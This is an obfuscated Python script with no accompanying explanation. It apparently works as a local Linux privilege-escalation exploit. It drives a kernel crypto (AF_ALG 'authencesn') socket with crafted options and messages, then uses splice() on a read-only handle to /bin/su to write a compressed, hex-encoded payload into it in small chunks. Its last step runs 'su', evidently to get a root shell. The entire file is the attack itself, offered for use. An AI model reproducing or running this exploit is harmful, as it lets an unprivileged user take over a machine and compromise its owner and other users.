#!/usr/bin/env python
import os as g, zlib, socket as s, ctypes

libc = ctypes.CDLL('libc.so.6')

def d(x):
    return x.decode('hex')

def c(f, t, content):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg([b"A" * 4 + content], [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)], 32768)
    r, w = g.pipe()
    libc.splice(f, None, w, None, o, 0)
    libc.splice(r, None, u.fileno(), None, o, 0)
    try:
        u.recv(8 + t)
    except:
        pass

try:
    f_path = "/bin/su" if g.path.exists("/bin/su") else "/usr/bin/su"
    f = g.open(f_path, g.O_RDONLY)
    i = 0
    e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
    while i < len(e):
        c(f, i, e[i:i+4])
        i += 4
    g.system("su")
except Exception as ex:
    print(str(ex))
